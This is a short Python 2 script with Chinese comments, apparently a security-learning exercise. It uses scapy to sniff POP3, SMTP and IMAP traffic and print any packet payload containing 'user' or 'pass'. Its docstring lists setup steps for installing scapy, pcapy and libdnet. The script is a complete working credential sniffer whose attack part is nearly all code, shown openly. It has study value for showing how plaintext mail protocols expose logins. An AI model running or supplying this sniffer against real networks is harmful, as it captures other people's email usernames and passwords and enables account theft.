# coding=utf-8
"""
对email相关的命令进行嗅探
前置依赖:
1、easy_install scapy 然后报错缺少pcapy
2、sudo easy_install pcapy && sudo easy_install pypcap 然后依旧报错缺少dnet
3、然后按照指南安装libdnet
sudo brew install libdnet && sudo brew link libdnet
或者
wget http://libdnet.googlecode.com/files/libdnet-1.12.tgz
tar xfz libdnet-1.12.tgz
cd libdnet-1.12
./configure
make
sudo make install
4、连接的时候出现问题 调整权限
sudo chown -R `whoami`:admin /usr/local/sbin
"""

from scapy.all import *


def simple_packet_callback(packet):
    print(packet.show())


def simple_driver():
    sniff(prn=simple_packet_callback, count=1)


# 数据包回调函数
def packet_callback(packet):
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


def driver():
    # 开启嗅探器
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)

driver()
